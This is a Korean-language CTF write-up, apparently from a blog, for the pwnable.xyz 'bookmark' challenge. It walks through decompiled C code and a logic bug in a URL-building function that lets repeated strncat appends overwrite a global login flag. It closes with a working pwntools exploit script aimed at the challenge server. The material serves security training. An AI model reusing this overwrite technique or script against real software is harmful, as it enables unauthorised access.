---
title: "[pwnable.xyz]bookmark"
date: 2020-1-31
tags: [pwnable.xyz]
categories: [pwnable.xyz]
---

랭킹 1페이지 찍엇당..

우선 바이너리를 보호기법 다 걸려있다.

```
[*] '/vagrant/ctfs/challenge'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

메인함수 처음 시작에 `qword_202300` 라는 전역변수에 랜덤값을 넣어준다.

```c
int init_login()
{
  int fd; // [rsp+Ch] [rbp-4h]

  fd = open("/dev/urandom", 0);
  if ( fd == -1 )
    exit(1);
  read(fd, &qword_202300, 8uLL);
  return close(fd);
}
```

1번 메뉴에서는 랜덤값을 저장한 변수와 입력한 값을 비교해서 `dword_202308` 변수에 1을 넣어주는데 이를 통해 4번 메뉴에서 win함수를 호출시킬 수 있다. 아마 이 문제의 핵심은 `qword_202300` 를 알아내거나 `dword_202308` 를 0이 아닌 아무 값으로 덮어주면 되는 것이다.

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  __int64 savedregs; // [rsp+10h] [rbp+0h]

  setup();
  init_login();
  puts("Web bookmarks.");
  while ( 1 )
  {
    print_menu();
    read_long();
    switch ( &savedregs )
    {
      case 0u:
        return 0;
      case 1u:
        printf("Password: ", argv);
        if ( qword_202300 == read_long() )
          dword_202308 = 1;
        break;
      case 2u:
        create_url();
        break;
      case 3u:
        argv = bm;
        printf("url: %s\n", bm);
        break;
      case 4u:
        if ( dword_202308 )
        {
          puts("Not Implemented.");
          puts("But here is a reward.");
          win();
        }
        break;
      default:
        puts("Invalid");
        break;
    }
  }
}
```

여기서 bm이라는 전역변수에 값을 써줄 수 있는 곳이다.

```c
int create_url()
{
  void *buf; // ST18_8
  signed int v2; // [rsp+Ch] [rbp-14h]
  char *v3; // [rsp+10h] [rbp-10h]

  printf("Secure or insecure: ");
  read(0, bm, 9uLL);
  if ( strncmp(bm, "http", 4uLL) )
    return puts("Not a valid URL.");
  if ( byte_202204 == 's' )
    v3 = &unk_202205;
  else
    v3 = &byte_202204;
  while ( *v3 == ':' || *v3 == '/' )
    ++v3;
  *v3 = 0;
  printf("Size of url: ", "http");
  v2 = read_long();
  if ( v2 < 0 || v2 > 127 )
    return puts("Too large.");
  buf = malloc(v2);
  read(0, buf, v2);
  return strncat(bm, buf, 0x100uLL);
}
```

`create_url` 함수에서 로직 버그가 터진다. 만약 여기 bm에 strncat으로 이어붙이는데 계속 이어붙일 수 잇다면 bm과 `dword_202308` 의 거리는 264이기 때문에 덮을 수 있을거다.

```
bm = 0x0000000000202200
byte_202204 = 0x0000000000202204
unk_202205 = 0x0000000000202205
qword_202300 = 0x0000000000202300
dword_202308 0x0000000000202308
```

여기서 취약점은 *v3가 ':' 이거나 '/' 이면 ++v3; 해주기 때문에 취약점이 발생한다. 그로 인해 ':'나 '/'을 계속 넣어주면 `dword_202308` 변수를 덮을 수 있다.

> exploit.py

```python
from pwn import *

context.log_level = 'debug'
e = ELF('./challenge')
# p = process('./challenge')
p = remote('svc.pwnable.xyz',30021)
sa = lambda x,y : p.sendafter(x,y)
sla = lambda x,y : p.sendlineafter(x,y)

def login(passwd):
	sla('>','1')
	sa(':',passwd)

def create_url(url,size,data):
	sla('>','2')
	sa(':',url)
	sa(':',str(size))
	p.send(data)

def print_url():
	sla('>','3')

def save_url(): # win()
	sla('>','4')

def quit():
	sla('>','0')

create_url('https',127,':'*127)
create_url('https',127,':'*127)
create_url('https',127,':'*127)
#login(str(0x3a3a3a3a3a3a3a3a))
save_url()

p.interactive()
```